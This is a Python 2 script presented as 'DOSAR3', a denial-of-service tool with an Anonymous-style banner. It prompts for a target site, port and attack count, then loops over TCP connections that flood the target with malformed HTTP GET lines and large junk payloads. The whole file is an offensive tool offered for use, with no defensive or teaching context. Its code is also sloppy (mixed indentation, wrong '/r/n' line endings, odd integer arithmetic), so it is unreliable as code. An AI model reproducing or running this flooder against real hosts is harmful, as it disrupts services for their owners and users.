#!/usr/bin/python

import socket,time,os

ss = 1
"""
THIS TOOL

By:> Oseid Aldary

simple Tool for Dos-ATTACK wtih socket lib :)

"""

#COLORS============#
BLUE = '\033[94m'  #
GREEN = '\033[32m' #
RED = '\033[91m'   #
WHITE = '\033[0m'  #
#==================#
os.system('resize -s 38 150  > /dev/null')
#CHECK INTERNET CONNECTION =========================
os.system("clear||cls")
print(BLUE+" +-+-+-+-+-+-+-+-+-+-+-+-+-+")
print(WHITE+" |@|"+GREEN+">|>"+RED+"|D|O|S|"+WHITE+"-"+RED+"|A|R|3"+GREEN+"<|<"+WHITE+"|@|")
print(BLUE+" +-+-+-+-+-+-+-+-+-+-+-+-+-+\n")
print(BLUE+"\n[*]"+RED+":"+GREEN+"Checking Internet Connection"+RED+"...........")
time.sleep(3)

SERVER = "www.google.com"
def is_connected():
  try:

    host = socket.gethostbyname(SERVER)

    s = socket.create_connection((host, 80), 2)
    return True
  except:
     pass
  return False
if is_connected() == True:
                                print(BLUE+"\n[+]"+RED+":"+GREEN+"[ Connected ]")
                                time.sleep(2)

elif is_connected() == False:
                                print(RED+"\n[!]"+GREEN+"Your Not Connected To The Internet !!")
                                print(BLUE+"[*]"+RED+":"+GREEN+"Please Connect To The Internet And Try Again :)")
				print(WHITE+"Script Stoping"+RED+".......")
				time.sleep(1)
                                exit()

# END CHECK INTERNET CONNECTION ======================================================================


#Dos Function===================================

def dos(target, port, ss):
  try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = socket.gethostbyname(target)
		s.connect((host, int(port)))
		d1 = "20000000"
		d2 = "20000000000120"
                aa = "8921873"
                ww = "99919988"
		rer = 15
		data3 = int(d1) * int(d2)
		data4 = int(data3) * int(data3)
		data5 = int(data4) * int(data3)
		dat1 = int(data5) * int(data4) * int(ww) * int(ww) * int(aa) * int(data3) * int(data3) * int(data3) * int(data3) * int(data5)
		dat = int(dat1) * rer
		data6 = str(dat).encode("utf-8")
		word1 = ["saddasdasdasdAASDASDS_dASRASD*67*546653i454234()EWQEQDASDDAFAFSasdasdsamdSADASDASdsadjSASASDASDsadasDASDsa"]
		wew = word1 * rer
		word = str(wew).encode("utf-8")
      		print(GREEN+"Flooding:"+BLUE+" (=> ......["+RED+str(target)+":"+str(port)+"~tcp"+BLUE+"]....."+GREEN+"Attack=> "+RED+str(ss)+BLUE+" <=)")
		s.send("GET /"+ str(attacks)+"HTTP/1.1\r\n")
 		s.send("HOST: "+ target+ "/r/n/r/n");
		s.send("GET /"+ str(attacks)+"HTTP/1.1\r\n")
 		s.send("HOST: "+ target+ "/r/n/r/n");
		s.send(word)
		s.send(word)
		s.send(word)
		s.send(data6)
		s.send(data6)
		s.send(data6)
		s.send("GET /"+ str(attacks)+"HTTP/1.1\r\n")
 		s.send("HOST: "+ target+ "/r/n/r/n");
		s.send("GET /"+ str(attacks)+"HTTP/1.1\r\n")
 		s.send("HOST: "+ target+ "/r/n/r/n");
		s.send(word)
		s.send(word)
		s.send(word)
		s.send(data6)
		s.send(data6)
		s.send(data6)
		s.send("GET /"+ str(attacks)+"HTTP/1.1\r\n")
 		s.send("HOST: "+ target+ "/r/n/r/n");
		s.send("GET /"+ str(attacks)+"HTTP/1.1\r\n")
 		s.send("HOST: "+ target+ "/r/n/r/n");
 		s.send(word)
		s.send(word)
  except KeyboardInterrupt:
		 dd = ss - 1
		 print(BLUE+"\n\n[*]"+RED+":"+WHITE+"Stoping Attack........\n")
                 time.sleep(3)
	         print(BLUE+"\n[*]"+WHITE+":"+RED+"Attack stoped on ==>["+GREEN+str(target)+RED+"]=> Attacks Was Sent="+GREEN+str(dd)+RED+" ==(from)=>["+GREEN+str(attacks)+RED+"]\n")
                 exit()


os.system('clear || cls')
#Script Banner================================================================
print(RED+"""\n
$$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  {>>[ We Are Anonymous Arabs  ]
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ ___$$\ 
$$ |  $$ |$$ /  $$ |$$ /  \__|$$ /  $$ |$$ |  $$ |\_/   $$ |{>>[ We Are Legion           ]
$$ |  $$ |$$ |  $$ |\$$$$$$\  $$$$$$$$ |$$$$$$$  |  $$$$$ / 
$$ |  $$ |$$ |  $$ | \____$$\ $$  __$$ |$$  __$$<   \___$$\ {>>[ We Dont Forgive	 ]
$$ |  $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |  $$ |$$\   $$ | 
$$$$$$$  | $$$$$$  |\$$$$$$  |$$ |  $$ |$$ |  $$ |\$$$$$$  |{>>[ We Dont Forget	         ]
\_______/  \______/  \______/ \__|  \__|\__|  \__| \______/ 
							    {>>[ Expect Us	         ] """)

print(BLUE+"[---]\t by:>"+RED+" OSEID ALDARY\t"+BLUE+"[---]")
print(BLUE+"[---]\t Version:>"+RED+" 1.0\t        "+BLUE+"[---]\n")

print(GREEN+"======================"+WHITE+" Welcome"+GREEN+" TO [> "+RED+"DOSAR3 TOOL"+GREEN+" <] ======================")
time.sleep(1)

#Input target info for attack on him ===========================

target =raw_input(BLUE+"\n\n[*]"+RED+":"+GREEN+"Enter Target Site"+WHITE+":"+BLUE+"~"+WHITE+"# "+RED)
print(WHITE+"\nTarget ==> "+RED+target+WHITE)
print("\n================================")
port =int(input(BLUE+"\n\n[*]"+RED+":"+GREEN+"Enter Port"+WHITE+":"+BLUE+"~"+WHITE+"# "+RED))
print(WHITE+"\nPort ==> "+RED+str(port)+WHITE)
print("\n================================")
attacks =int(input(BLUE+"\n\n[*]"+RED+":"+GREEN+"Enter Number Of Attacks"+WHITE+":"+BLUE+"~"+WHITE+"# "+RED))
print(WHITE+"\nAttacks ==> "+RED+str(attacks)+WHITE)
print("\n================================")
time.sleep(2)

#Start Attack=====================

os.system("clear || cls")
print(RED+"\n>>[*]"+GREEN+"Attack Has Been Start On"+RED+"[>("+WHITE+str(target)+RED+")<]"+"\n")
time.sleep(2)
print RED+"[+]"+GREEN+"Sending "+GREEN+"["+RED+str(attacks)+GREEN+"]"+BLUE+" Attacks To The Target Site !\n";
time.sleep(1.5)
for i in range(0,int(attacks)):
	dos(target, port, ss)
	ss += 1

	if ss == attacks + 1:
				print(BLUE+"\n[*]"+RED+":"+GREEN+"Done!"+WHITE+" > The Attack Was Completed On  > ["+RED+str(target)+WHITE+"]"+ "> And "+str(attacks)+" Attacks Were Sent \n")

	else:
		pass


##############################################################
##################### 		     #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye


